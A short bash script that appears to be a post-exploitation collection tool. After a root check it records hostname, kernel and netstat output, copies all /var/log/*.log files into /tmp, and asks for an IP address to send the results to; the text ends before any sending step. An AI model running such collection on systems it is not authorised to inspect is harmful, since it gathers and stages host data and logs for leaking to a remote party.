#!/bin/bash

# Automated tool used to perform
# system configuration scraping


# Setup Variables and Arrays
OF=output
LOGFILES=logconfs
INFOGRAB=("hostname" "uname -a" "netstat -plant")


# Set-up files
touch /tmp/$OF
mkdir /tmp/$LOGFILES


# Check to see if root
if [ `whoami` == root ]; then
	echo "[+] Confirmed User is Root";
else
	echo "[-] User must be root to access all files. Quitting";
	exit 0
fi


# Target to send files to
echo -n "IP Address to send results to followed by [Enter]:"
read TARGET


for i in "${INFOGRAB[@]}"; do
	echo "[+] Sending data from $i to $OF";
	printf "\n" >> $OF
	echo "[# # # # # # FILENAME: $i # # # # # #" >> $OF;
	printf "\n" >> $OF
	$i >> $OF;
done



# File Grab

for i in `find /var/log/*.log | cut -f 4 -d /`; do
	echo "[+] Copying file to /tmp/$LOGFILES/$i";
	cp /var/log/$i /tmp/$LOGFILES/$i;
done

